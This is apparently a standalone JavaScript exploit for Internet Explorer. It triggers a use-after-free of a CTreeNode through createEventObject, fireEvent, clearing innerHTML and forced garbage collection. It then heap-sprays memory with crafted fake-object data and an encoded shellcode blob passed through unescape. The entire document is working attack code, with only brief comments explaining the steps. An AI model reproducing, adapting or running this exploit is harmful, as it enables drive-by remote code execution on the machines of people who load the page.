var e1 = null;
var buf = "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141";
var shellcode = unescape("%uec83%u9064%u98b8%u5528%uda45%ud9c9%u2474%u31f4%ub1c9%u5b33%u4331%u8313%ufceb%u4303%uca97%ub9a0%u834f%u424b%uf48f%ua7c2%u26be%uacb0%uf692%ue1b2%u7c1e%u1196%uf095%u153f%ube1e%u1819%u0e9f%uf6a6%u1063%u055a%uf2b7%uc663%uf3ca%u3ba4%ua124%u377d%u5696%u0509%u562a%u01dd%u2012%ud558%u9ae6%u0663%u9056%ube2c%ufedd%ubf8c%u1d32%uf6f0%ud63f%u0882%u26e9%u3b6a%ue5d5%uf355%uf4d8%u3492%u8302%u46e8%u94bf%u342a%u101b%u9eaf%u82e8%u1e0b%u543d%u2cdf%u128a%u3087%uf60d%u4db3%uf986%uc413%udddc%u8cb7%u7c87%u68e1%u8066%ud5f1%u24d7%uf779%u5e0c%u9220%ud2d3%udb5e%uecd3%u4c60%uddbb%u03eb%ue1bc%u6039%ua832%uc160%u75da%u53f1%u8587%u972f%u05b1%u68da%u1546%u6daf%u9103%u1c43%u741c%ub364%u5d1d%u5207%u3d8d%uf1e6%ua735%uf3f6");
var r1 = new Array(256);

var allocatedBlocks = new Array(100);

function heapspray(data, backData) {

    // Create a string of 100,000 characters, taking up 200,000 bytes in memory.
    var str = "\u4141";
    var base = data;

    // Fill 64 kb block
    while (base.length < (64*512 - (backData.length / 2) - 1))
        base += str;

    base += backData

    sixtyFourKB = base.substr(0, 64*512);

    var mbBlock = "";
    var headerSize = 0x34/2;

    var count = 0;
    while (count++ < 15) {
        mbBlock += sixtyFourKB;
    }

    mbBlock += sixtyFourKB.substr(0, sixtyFourKB.length - headerSize);

    count = 0;
    while (count++ < 100) {
        allocatedBlocks[count] = mbBlock.substr(0, mbBlock.length);
    }
}

function c(b, n) {
    var a = "";
    for (var i = 0; i < n; i++) {
        a += b;
    }
    return a;
}
    
for (var i = 20 ; i < 256; i++){
    r1[i] = document.createElement("param")
}

function ev1() {
    e1 = document.createEventObject(event);
    window.setTimeout(ev2, 0);
}

function ev2() {
    data =  "\uffbc\u07cf";
    data += "\u4242\u4242";
    data += "\u575B\u63F0";
    data += c("\u4242", 80);
    data += shellcode;

    var backData = "\u4Cfa\u63F0";
    backData += "\u0000\u07d0";
    backData += "\uffff\u0000";
    backData += "\u0040\u0000";
    backData += "\u0000\u07d4";
    backData += "\u00c0\u07d0";
    backData += "\u00c0\u07d0";
    backData += c("\u4444", 100 - backData.length - 1);

    heapspray(data, backData);

    CollectGarbage();
    document.getElementById("sp1").innerHTML = ""; 
    CollectGarbage();                                   // CTreeNode is free-ed after being marked in previous line
    
    // Attempt to overwrite data the free-ed
    // CTreeNode points to 

    for(var i = 20; i < 256; i++) {
        r1[i].name = c("\u0024\u07d0", 76/4);
    }
    
    var x = e1.srcElement;                              // CTreeNode's srcElement is attmepted to be accessed
}

function main() {
    var sp1 = document.createElement("span");
    sp1.id = "sp1";
    
    // Reduces heap fragmentation by filling in unallocated
    // heap blocks with equally sized heap blocks

    for (var i = 0; i < 20; i++){
        r1[i] = document.createElement("div"); 
    }
    
    var div1 = document.createElement("div");           // CTreeNode is allocated
    div1.onclick = ev1;

    document.body.appendChild(sp1);
    sp1.appendChild(div1);

    div1.fireEvent("onclick");
}